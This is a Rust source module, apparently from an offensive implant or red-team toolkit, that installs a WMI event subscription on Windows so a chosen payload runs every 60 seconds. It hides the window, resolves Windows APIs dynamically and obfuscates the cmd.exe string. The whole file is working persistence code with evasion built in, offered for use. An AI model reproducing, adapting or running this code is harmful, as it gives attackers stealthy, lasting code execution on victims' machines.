use crate::log::LogSink;
#[allow(unused_imports)]
use super::{PersistConfig, PersistResult, PersistMethod};

pub fn persist(config: &PersistConfig, log: &LogSink) -> Result<PersistResult, String> {
    if config.name.is_empty() {
        return Err("subscription name is required".to_string());
    }
    if config.payload_path.is_empty() {
        return Err("payload path is required".to_string());
    }

    #[cfg(not(windows))]
    {
        let _ = log;
        return Err("requires Windows".to_string());
    }

    #[cfg(windows)]
    {
        let wmic_cmd = format!(
            "/c wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilterToConsumerBinding CREATE \
             Filter=\"__EventFilter.Name='{name}'\" Consumer=\"CommandLineEventConsumer.Name='{name}'\" && \
             wmic /NAMESPACE:\\\\root\\subscription PATH __EventFilter CREATE \
             Name=\"{name}\" EventNameSpace=\"root\\cimv2\" \
             QueryLanguage=\"WQL\" Query=\"SELECT * FROM __InstanceModificationEvent WITHIN 60 \
             WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\" && \
             wmic /NAMESPACE:\\\\root\\subscription PATH CommandLineEventConsumer CREATE \
             Name=\"{name}\" CommandLineTemplate=\"{payload}\"",
            name = config.name,
            payload = config.payload_path,
        );

        log.step("Step 1: Configure event subscription");

        let cmd_exe_str = crate::obf::s(crate::obf::CMD_EXE);
        let app_wide: Vec<u16> = cmd_exe_str.encode_utf16().chain(std::iter::once(0)).collect();
        let mut cmd_wide: Vec<u16> = wmic_cmd.encode_utf16().chain(std::iter::once(0)).collect();

        #[repr(C)]
        struct StartupInfoW {
            cb: u32, _pad: [u8; 92],
        }
        #[repr(C)]
        struct ProcessInformation {
            process: *mut std::ffi::c_void,
            thread: *mut std::ffi::c_void,
            pid: u32, tid: u32,
        }

        unsafe {
            let mut si = std::mem::zeroed::<StartupInfoW>();
            si.cb = std::mem::size_of::<StartupInfoW>() as u32;
            let mut pi = std::mem::zeroed::<ProcessInformation>();

            let result = crate::resolve::CreateProcessW(
                app_wide.as_ptr(),
                cmd_wide.as_mut_ptr(),
                std::ptr::null(),
                std::ptr::null(),
                0,
                0x08000000,
                std::ptr::null(),
                std::ptr::null(),
                &si as *const _ as *const std::ffi::c_void,
                &mut pi as *mut _ as *mut std::ffi::c_void,
            );

            if result == 0 {
                return Err("event subscription process failed".to_string());
            }

            crate::resolve::WaitForSingleObject(pi.process, 15000);
            crate::resolve::CloseHandle(pi.process);
            crate::resolve::CloseHandle(pi.thread);
        }

        log.info(format!("  Subscribed: {} -> {}", config.name, config.payload_path));

        Ok(PersistResult {
            method: PersistMethod::WmiSubscription,
            description: format!("Event subscription '{}' configured", config.name),
        })
    }
}
